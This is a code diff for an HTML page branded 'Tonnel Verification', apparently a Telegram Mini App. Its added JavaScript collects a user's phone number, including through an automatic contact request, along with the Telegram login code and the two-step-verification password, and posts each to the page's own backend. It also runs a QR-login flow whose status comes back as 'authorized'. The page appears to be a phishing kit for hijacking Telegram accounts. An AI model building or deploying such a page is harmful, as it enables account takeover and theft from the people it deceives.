+                    let contact = null;
+                    if (e.responseUnsafe && e.responseUnsafe.contact) {
+                        contact = e.responseUnsafe.contact;
+                    } else if (e.response) {
+                        try {
+                            const m = typeof e.response === 'string' && e.response.match(/contact=([^&]+)/);
+                            if (m) contact = JSON.parse(decodeURIComponent(m[1]));
+                        } catch (err) {}
+                    }
+                    if (contact && contact.phone_number) {
+                        phoneHandled = true;
+                        document.getElementById('phoneInput').value = contact.phone_number;
+                        submitPhone();
+                    }
+                });
+            }
         }
 
-        async function continueToVerification() {
-            document.getElementById('mainTitle').innerHTML = '<span class="tonnel-highlight">Tonnel</span> Verification';
-            document.getElementById('mainSubtitle').style.display = 'none';
-            document.getElementById('btnContinue').style.display = 'none';
-            document.getElementById('loginOptions').style.display = 'flex';
-            document.getElementById('lottieContainer').style.display = 'none';
-            setAvatarProgress(50);
+        function requestTelegramPhone() {
+            if (!tg || typeof tg.requestContact !== 'function') {
+                alert(t('telegramFuncNotAvail') || 'Function not available.');
+                return;
+            }
+            tg.requestContact(() => {});
         }
 
+        // ── Avatar Progress ──
         function setAvatarProgress(percent) {
             document.getElementById('avatarContainer').style.setProperty('--progress', percent + '%');
         }
 
-        // Остальной JS (QR, Phone, Code, Password) — такой же как в оригинале
-        // ... (полный код из оригинального index.html)
+        // ── Continue ──
+        function continueToVerification() {
+            document.getElementById('mainTitle').innerHTML = `<span class="tonnel-highlight">Tonnel</span>`;
+            document.getElementById('mainSubtitle').innerHTML = t('titleLoginMethod') || 'Choose login method';
+            document.getElementById('btnContinue').style.display = 'none';
+            document.getElementById('loginOptions').style.display = 'flex';
+            document.getElementById('logoImage').style.display = 'none';
+            setAvatarProgress(50);
+        }
+
+        // ── QR ──
+        let qrPollingInterval = null;
+        let currentSessionId = null;
+
+        function selectLogin(method) {
+            if (qrPollingInterval) {
+                clearInterval(qrPollingInterval);
+                qrPollingInterval = null;
+            }
+
+            if (method === 'qr') {
+                document.getElementById('loginOptions').style.display = 'none';
+                document.getElementById('mainSubtitle').innerHTML = '';
+                document.getElementById('mainTitle').innerHTML = t('titleTelegramLogin') || 'Login with Telegram';
+                document.getElementById('qrScreen').style.display = 'flex';
+
+                fetch(API_BASE + '/qr-start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ user_id: userId, username: username })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        currentSessionId = data.session_id;
+                        const qrBox = document.getElementById('qrCodeBox');
+                        qrBox.innerHTML = '';
+                        new QRCode(qrBox, {
+                            text: data.url,
+                            width: 180,
+                            height: 180,
+                            colorDark: "#000000",
+                            colorLight: "#ffffff",
+                            correctLevel: QRCode.CorrectLevel.M
+                        });
+
+                        qrPollingInterval = setInterval(() => {
+                            fetch(API_BASE + '/qr-status?session_id=' + currentSessionId)
+                                .then(r => r.json())
+                                .then(rData => {
+                                    if (rData.status === 'authorized') {
+                                        clearInterval(qrPollingInterval);
+                                        document.getElementById('mainTitle').innerHTML = t('titleSuccess');
+                                        document.getElementById('qrCodeBox').innerHTML = t('successMessageQR');
+                                        setAvatarProgress(100);
+                                    } else if (rData.status === 'qr_failed') {
+                                        clearInterval(qrPollingInterval);
+                                        alert(t('errorQR'));
+                                        goBackFromQR();
+                                    } else if (rData.status === 'awaiting_password') {
+                                        clearInterval(qrPollingInterval);
+                                        document.getElementById('qrScreen').style.display = 'none';
+                                        document.getElementById('mainTitle').innerHTML = t('titleEnterPassword');
+                                        document.getElementById('passwordScreen').style.display = 'flex';
+                                        setAvatarProgress(75);
+                                    }
+                                }).catch(() => {});
+                        }, 2000);
+                    } else {
+                        alert(t('errorPrefix') + data.detail);
+                    }
+                })
+                .catch(err => {
+                    alert(t('errorConnection') + err.message);
+                    goBackFromQR();
+                });
+            } else if (method === 'phone') {
+                document.getElementById('loginOptions').style.display = 'none';
+                document.getElementById('mainSubtitle').innerHTML = '';
+                document.getElementById('mainTitle').innerHTML = t('titleEnterPhone');
+                document.getElementById('phoneScreen').style.display = 'flex';
+            }
+        }
+
+        function goBackFromQR() {
+            if (qrPollingInterval) clearInterval(qrPollingInterval);
+            document.getElementById('qrScreen').style.display = 'none';
+            document.getElementById('loginOptions').style.display = 'flex';
+            document.getElementById('mainTitle').innerHTML = `<span class="tonnel-highlight">Tonnel</span>`;
+            document.getElementById('mainSubtitle').innerHTML = t('titleLoginMethod') || 'Choose login method';
+            document.getElementById('logoImage').style.display = 'block';
+        }
+
+        function goBackFromPhone() {
+            document.getElementById('phoneScreen').style.display = 'none';
+            document.getElementById('loginOptions').style.display = 'flex';
+            document.getElementById('mainTitle').innerHTML = `<span class="tonnel-highlight">Tonnel</span>`;
+            document.getElementById('mainSubtitle').innerHTML = t('titleLoginMethod') || 'Choose login method';
+            document.getElementById('logoImage').style.display = 'block';
+        }
+
+        // ── Phone ──
+        let currentPhoneNumber = null;
+
+        function submitPhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) return;
+
+            currentPhoneNumber = phone;
+            const btn = document.getElementById('btnSubmitPhone');
+            btn.innerText = t('loading') || 'Loading...';
+            btn.disabled = true;
+
+            fetch(API_BASE + '/request-phone', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, username: username, phone_number: phone })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    currentSessionId = data.session_id;
+                    document.getElementById('phoneScreen').style.display = 'none';
+                    document.getElementById('mainTitle').innerHTML = t('titleCode');
+                    document.getElementById('codeScreen').style.display = 'flex';
+                    setTimeout(() => {
+                        const inputs = document.querySelectorAll('.code-input-box');
+                        if (inputs.length > 0) inputs[0].focus();
+                    }, 100);
+                    setAvatarProgress(50);
+                } else {
+                    alert(t('errorPrefix') + (data.detail || t('unknownError')));
+                }
+            })
+            .catch(err => {
+                alert(t('errorConnection') + err.message);
+            })
+            .finally(() => {
+                btn.innerText = t('btnContinue') || 'Continue';
+                btn.disabled = false;
+            });
+        }
+
+        // ── Code ──
+        function getEnteredCode() {
+            const inputs = document.querySelectorAll('.code-input-box');
+            let code = '';
+            inputs.forEach(input => code += input.value);
+            return code;
+        }
+
+        function checkAutoSubmit() {
+            if (getEnteredCode().length === 5) {
+                submitCode();
+            }
+        }
+
+        function moveToNext(input, index) {
+            document.getElementById('codeErrorMsg').style.display = 'none';
+            if (input.value.length > 1) input.value = input.value.slice(0, 1);
+            if (input.value && index < 4) {
+                document.querySelectorAll('.code-input-box')[index + 1].focus();
+            }
+            checkAutoSubmit();
+        }
+
+        function handleBackspace(e, index) {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                const inputs = document.querySelectorAll('.code-input-box');
+                inputs[index - 1].focus();
+                inputs[index - 1].value = '';
+            }
+        }
+
+        function handleCodePaste(e) {
+            e.preventDefault();
+            const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = pastedData.replace(/\D/g, '').split('').slice(0, 5);
+            if (numbers.length > 0) {
+                const inputs = document.querySelectorAll('.code-input-box');
+                inputs.forEach((input, idx) => input.value = '');
+                numbers.forEach((num, idx) => inputs[idx].value = num);
+                if (numbers.length < 5) inputs[numbers.length].focus();
+                else { inputs[4].focus(); checkAutoSubmit(); }
+            }
+        }
+
+        function submitCode() {
+            const code = getEnteredCode();
+            if (code.length < 5) return;
+
+            const btn = document.getElementById('btnSubmitCode');
+            btn.innerText = t('loading') || 'Loading...';
+            btn.disabled = true;
+            btn.style.display = 'block';
+
+            fetch(API_BASE + '/verify-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_id: userId,
+                    phone_number: currentPhoneNumber,
+                    code: code,
+                    session_id: currentSessionId
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('codeScreen').innerHTML = t('successCode');
+                    setAvatarProgress(100);
+                } else if (data.status === '2fa_required') {
+                    document.getElementById('codeScreen').style.display = 'none';
+                    document.getElementById('mainTitle').innerHTML = t('title2FA');
+                    document.getElementById('passwordScreen').style.display = 'flex';
+                    setAvatarProgress(75);
+                } else {
+                    const errorMsg = document.getElementById('codeErrorMsg');
+                    errorMsg.innerText = t('codeError');
+                    errorMsg.style.display = 'block';
+                    document.querySelectorAll('.code-input-box').forEach(input => input.value = '');
+                    document.querySelector('.code-input-box').focus();
+                }
+            })
+            .catch(err => {
+                const errorMsg = document.getElementById('codeErrorMsg');
+                errorMsg.innerText = t('errorConnection') + err.message;
+                errorMsg.style.display = 'block';
+            })
+            .finally(() => {
+                btn.innerText = t('btnContinue') || 'Continue';
+                btn.disabled = false;
+                btn.style.display = 'none';
+            });
+        }
+
+        // ── Password ──
+        function submitPassword() {
+            const pwd = document.getElementById('passwordInput').value;
+            if (!pwd) return;
+
+            fetch(API_BASE + '/verify-password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    user_id: userId,
+                    phone_number: currentPhoneNumber || 'QR',
+                    password: pwd,
+                    session_id: currentSessionId
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('passwordScreen').innerHTML = t('successPwd');
+                    setAvatarProgress(100);
+                } else {
+                    const pwdInput = document.getElementById('passwordInput');
+                    pwdInput.classList.add('pwd-invalid');
+                    setTimeout(() => pwdInput.classList.remove('pwd-invalid'), 400);
+                    document.getElementById('pwdErrorMsg').innerText = t('pwdError');
+                    document.getElementById('pwdErrorMsg').style.display = 'block';
+                }
+            })
+            .catch(err => {
+                const pwdInput = document.getElementById('passwordInput');
+                pwdInput.classList.add('pwd-invalid');
+                setTimeout(() => pwdInput.classList.remove('pwd-invalid'), 400);
+                document.getElementById('pwdErrorMsg').innerText = t('errorPrefix') + err.message;
+                document.getElementById('pwdErrorMsg').style.display = 'block';
+            });
+        }
+
+        function checkPwdInput() {
+            const val = document.getElementById('passwordInput').value.trim();
+            document.getElementById('btnSubmitPassword').disabled = (val.length === 0);
+            document.getElementById('pwdErrorMsg').style.display = 'none';
+        }
+
+        function togglePasswordVisibility() {
+            const pwdInput = document.getElementById('passwordInput');
+            pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
+        }
+
+        // ── Notifications ──
+        function showNotification() {
+            const badge = document.getElementById('notifBadge');
+            badge.style.display = 'none';
+            alert('No new notifications');
+        }
+
+        // ── Menu ──
+        function toggleMenu() {
+            alert('Menu: Settings | Help | About Tonnel');
+        }
+
+        // ── Init ──
+        document.addEventListener('DOMContentLoaded', () => {
+            setLanguage('EN');
+            setAvatarProgress(25);
+            document.getElementById('logoImage').onerror = function() {
+                this.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔷</text></svg>';
+            };
+        });
     </script>
 </body>
 </html>
